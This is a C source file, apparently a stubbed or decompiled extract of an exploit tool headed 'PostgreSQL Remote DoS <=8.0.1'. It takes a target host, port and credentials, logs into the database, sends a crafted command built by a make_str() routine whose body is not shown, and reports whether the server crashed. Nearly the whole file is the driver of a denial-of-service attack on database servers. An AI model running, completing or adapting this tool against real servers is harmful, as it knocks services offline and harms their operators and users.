
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct hostent {int dummy; } ;
typedef int PGresult ;
typedef int PGconn ;


 scalar_t__ CONNECTION_BAD ;
 char* DEFAULT_DB ;
 char* DEFAULT_PORT ;
 char EOF ;
 scalar_t__ PGRES_TUPLES_OK ;
 int * PQexec (int *,int ) ;
 int PQfinish (int *) ;
 scalar_t__ PQresultStatus (int *) ;
 int * PQsetdbLogin (char*,char*,int *,int *,char*,char*,char*) ;
 scalar_t__ PQstatus (int *) ;
 int exit (int) ;
 char getopt (int,char**,char*) ;
 int make_str () ;
 char* optarg ;
 int printf (char*,...) ;
 int str ;
 int usage (char*) ;

int main(int argc, char *argv[]){
char opt;
char *host = ((void*)0), *port = ((void*)0), *user = ((void*)0), *password = ((void*)0), *dbname = ((void*)0);
struct hostent *he;
PGconn *conn;
PGresult *res;

while((opt = getopt(argc, argv, "H:P:u:p:d:")) != EOF){
 switch(opt){
  case 'H':
   host = optarg;
   break;
  case 'P':
   port = optarg;
   break;
  case 'u':
   user = optarg;
   break;
  case 'p':
   password = optarg;
   break;
  case 'd':
   dbname = optarg;
   break;
  default:
   usage(argv[0]);
   break;
 }
}
if(host == ((void*)0)) usage(argv[0]);
if(user == ((void*)0)) usage(argv[0]);
if(password == ((void*)0)) usage(argv[0]);
if(port == ((void*)0)) port = DEFAULT_PORT;
if(dbname == ((void*)0)) dbname = DEFAULT_DB;

printf("\tPostgreSQL Remote DoS <=8.0.1\n");
printf("[*] Host/Port: %s/%s\n", host, port);
printf("[*] DBname/User/Password: %s/%s/%s\n", dbname, user, password);

conn = PQsetdbLogin(host, port, ((void*)0), ((void*)0), dbname, user, password);
if(PQstatus(conn) == CONNECTION_BAD){
 PQfinish(conn);
 printf("[-] Cannot connect to the database\n");
 exit(1);
}
printf("[+] Connected to the database\n");

make_str();
printf("[+] Command has been generated\n");
res = PQexec(conn, str);
if (PQresultStatus(res) == PGRES_TUPLES_OK){
 printf("[+] Command has been sent\n");
}
if(PQstatus(conn) == CONNECTION_BAD){
 printf("[+] Server has been rebooted\n");
 exit(0);
} else {
 printf("[-] Server hasnt been rebooted\n");
 exit(0);
}
}
